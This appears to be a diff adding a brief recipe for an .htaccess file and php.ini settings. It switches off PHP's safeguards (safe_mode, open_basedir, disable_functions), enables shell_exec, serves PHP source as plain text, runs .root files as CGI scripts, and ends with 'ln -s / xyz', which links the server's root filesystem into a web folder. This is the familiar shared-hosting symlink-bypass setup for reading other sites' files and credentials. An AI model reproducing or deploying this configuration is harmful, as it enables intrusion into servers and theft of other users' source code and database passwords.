@@ -1,0 +1,25 @@
+Creat .htaccess file :
+
+
+    Options +FollowSymLinks
+    DirectoryIndex Index.html
+    Options +Indexes
+
+    AddType text/plain .php
+    AddHandler server-parsed .php
+
+    AddType root .root
+    AddHandler cgi-script .root
+    AddHandler cgi-script .root
+
+php.ini code:
+
+safe_mode = Off
+disable_functions =
+safe_mode_gid = Off
+open_basedir = Off
+register_globals = on
+exec = On
+shell_exec = On
+
+ln -s / xyz
